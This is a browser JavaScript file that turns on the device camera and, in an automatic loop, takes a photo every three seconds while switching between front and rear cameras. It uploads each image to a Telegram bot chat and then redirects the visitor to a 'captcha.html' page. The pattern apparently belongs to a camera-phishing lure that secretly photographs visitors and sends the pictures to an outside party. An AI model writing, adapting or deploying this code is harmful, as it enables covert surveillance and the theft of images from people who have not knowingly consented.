const video = document.getElementById("video");

let stream;
let interval;
let useFront = true;

// Toast
function toast(msg){
  let t = document.createElement("div");
  t.innerText = msg;
  t.style = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#000;color:#fff;padding:10px;border-radius:6px;";
  document.body.appendChild(t);
  setTimeout(()=>t.remove(),2000);
}

// Start Camera
async function startCamera(){
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video:true });
    video.srcObject = stream;
    toast("📷 Camera Started");
  }catch{
    toast("❌ Permission Denied");
  }
}

// Switch Camera
async function switchCamera(){
  if(stream) stream.getTracks().forEach(t=>t.stop());

  useFront = !useFront;

  stream = await navigator.mediaDevices.getUserMedia({
    video:{ facingMode: useFront ? "user" : "environment" }
  });

  video.srcObject = stream;
}

// Capture
async function capture(){
  let canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  let ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  canvas.toBlob(sendPhoto,'image/jpeg');
}

// Send Telegram
async function sendPhoto(blob){
  let fd = new FormData();
  fd.append("chat_id", CONFIG.CHAT_ID);
  fd.append("photo", blob);

  toast("📤 Sending...");

  await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
    method:"POST",
    body:fd
  });

  toast("✅ Sent");
}

// Auto System
function startAuto(){
  toast("🚀 Auto Started");

  interval = setInterval(async ()=>{
    await capture();
    await switchCamera();
  },3000);

  setTimeout(()=>{
    clearInterval(interval);
    window.location.href = "captcha.html";
  },15000);
}
